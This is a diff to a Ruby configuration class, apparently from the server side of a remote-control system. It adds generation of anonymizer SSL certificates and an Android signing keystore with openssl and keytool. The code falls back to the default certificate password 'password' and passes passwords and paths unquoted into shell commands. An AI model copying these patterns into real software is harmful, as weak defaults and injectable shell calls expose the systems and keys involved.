@@ -95,6 +95,9 @@ class Config
     # default password if not configured in the config file
     Config.instance.global['CERT_PASSWORD'] ||= 'password'
 
+    # generate the network cert if not existent (retrocomp for 8.1.1 which introduced it)
+    generate_certificates_anon unless File.exist? Config.instance.cert('rcs-network.pem')
+
     return true
   end
 
@@ -179,10 +182,9 @@ class Config
     end
 
     generate_certificates(options) if options[:gen_cert]
+    generate_certificates_anon if options[:gen_cert_anon]
 
     generate_keystores if options[:gen_keystores]
-
-    puts options.inspect
 
     use_pfx_cert(options[:pfx_cert]) if options[:pfx_cert]
 
@@ -313,6 +315,52 @@ class Config
     trace :info, "done."
   end
 
+  def generate_certificates_anon
+    trace :info, "Generating anon ssl certificates..."
+
+    Dir.chdir File.join(Dir.pwd, CERT_DIR) do
+
+      File.open('index.txt', 'wb+') { |f| f.write '' }
+      File.open('serial.txt', 'wb+') { |f| f.write '01' }
+
+      trace :info, "Generating a new Anon CA authority..."
+      subj = "/CN=\"default\""
+      system "openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-anon-ca.key -out rcs-anon-ca.crt -config openssl.cnf"
+
+      return unless File.exist? 'rcs-anon-ca.crt'
+
+      trace :info, "Generating anonymizer certificate..."
+      system "openssl req -subj /CN=server -batch -days 3650 -nodes -new -keyout rcs-anon.key -out rcs-anon.csr -config openssl.cnf"
+
+      return unless File.exist? 'rcs-anon.key'
+
+      trace :info, "Signing certificates..."
+      system "openssl ca -batch -days 3650 -out rcs-anon.crt -in rcs-anon.csr -config openssl.cnf -name CA_network"
+
+      trace :info, "Creating certificates bundles..."
+
+      # create the PEM file for all the collectors
+      File.open('rcs-network.pem', 'wb+') do |f|
+        f.write File.read('rcs-anon.crt')
+        f.write File.read('rcs-anon.key')
+        f.write File.read('rcs-ca.crt')
+      end
+
+      trace :info, "Removing temporary files..."
+      # CA related files
+      ['index.txt', 'index.txt.old', 'index.txt.attr', 'serial.txt', 'serial.txt.old', 'rcs-anon-ca.crt', 'rcs-anon-ca.key',].each do |f|
+        File.delete f
+      end
+
+      # intermediate certificate files
+      ['01.pem', 'rcs-anon.csr', 'rcs-anon.crt', 'rcs-anon.key'].each do |f|
+        File.delete f
+      end
+    end
+    trace :info, "done."
+  end
+
+
   def generate_keystores
     trace :info, "Generating key stores for Java Applet..."
     FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
@@ -327,11 +375,17 @@ class Config
     trace :info, "Using pfx cert for windows code signing..."
     FileUtils.cp pfx, Config.instance.cert("windows.pfx")
 
-    trace :info, "Using pfx cert to create applet keystore..."
+    trace :info, "Using pfx cert to create Java Applet keystore..."
     FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
     system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
     system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name signapplet -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
     system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('applet.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
+
+    trace :info, "Using pfx cert to create Android keystore..."
+    FileUtils.rm_rf(Config.instance.cert('android.keystore'))
+    system "openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain"
+    system "openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name ServiceCore -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']}"
+    system "keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('android.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']}"
 
     # remove temporary files
     ['pfx.pem', 'pfx.p12'].each do |f|
@@ -415,14 +469,17 @@ class Config
 
       opts.separator ""
       opts.separator "Certificates options:"
-      opts.on( '-g', '--generate-certs', 'Generate the SSL certificates needed by the system' ) do
-        options[:gen_cert] = true
-      end
       opts.on( '-G', '--generate-ca', 'Generate a new CA authority for SSL certificates' ) do
         options[:gen_ca] = true
       end
       opts.on( '-A', '--anon-ca NAME', String, 'Generate an anonymous CA (you specify the name)' ) do |name|
         options[:ca_name] = name
+      end
+      opts.on( '-g', '--generate-certs', 'Generate the SSL certificates needed by the system' ) do
+        options[:gen_cert] = true
+      end
+      opts.on( '-a', '--generate-certs-anon', 'Generate the SSL certificates used by anonymizers' ) do
+        options[:gen_cert_anon] = true
       end
       opts.on( '-c', '--ca-pem FILE', 'The certificate file (pem) of the issuing CA' ) do |file|
         options[:ca_pem] = file
